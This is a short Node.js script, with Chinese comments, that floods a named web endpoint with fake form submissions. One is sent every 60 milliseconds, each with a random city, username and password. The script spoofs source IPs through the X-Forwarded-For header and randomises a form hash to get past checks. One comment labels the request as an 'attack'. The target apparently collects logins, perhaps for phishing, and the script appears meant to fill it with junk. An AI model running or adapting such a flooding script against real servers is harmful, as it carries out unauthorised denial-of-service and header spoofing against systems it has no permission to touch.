const express = require('express');
const axios = require('axios');
const randomNum = require('zhf.random-num');
const randomPassword = require('zhf.random-password');
const app = express();
setInterval(function () {
    // 地址
    const addressArr = ['北京市', '天津市', '辽宁省沈阳市', '吉林省长春市', '黑龙江省哈尔滨市', '上海市', '江苏省南京市', '湖北省武汉市', '广东省广州市', '重庆市', '四川省成都市', '陕西省西安市'];
    const addressLen = addressArr.length;
    const address = addressArr[Math.round(Math.random() * (addressLen - 1))];
    // ip
    const ip = `::ffff:${randomNum(1, 225)}.${randomNum(1, 225)}.${randomNum(1, 225)}.${randomNum(1, 225)}`;
    // 用户名
    const username = randomNum(111111, 9999999999);
    // 密码
    const password = randomPassword(randomNum(6, 16));
    console.log(address, ip, username, password);
    // 进攻
    axios({
        url: 'http://www.dnf-me.cn/in.asp?action=add',
        method: 'post',
        headers: {
            'x-forwarded-for': ip,
        },
        connection: {
            remoteAddress: ip, // 这个能获取到
            socket: {
                remoteAddress: ip,
            },
        },
        socket: {
            remoteAddress: ip, // 这个能获取到
        },
        data: {
            dede_fields: 'u,text;p,text',
            dede_fieldshash: ['d1WEGXsPu8CFufla1kRw8W8kW3QA2TG'.split('').sort(() => Math.random() - 0.5).join(''), 'd1WEGXsPu8CFufla1kRw8W8kW3QA2TG'][Math.round(Math.random())],
            ipku: address,
            ip: ip,
            j_dh: username,
            j_xm: randomPassword(randomNum(6, 16)),
        },
    }).then((json) => {
        console.log(json);
    });
}, 60);
app.listen('6661');
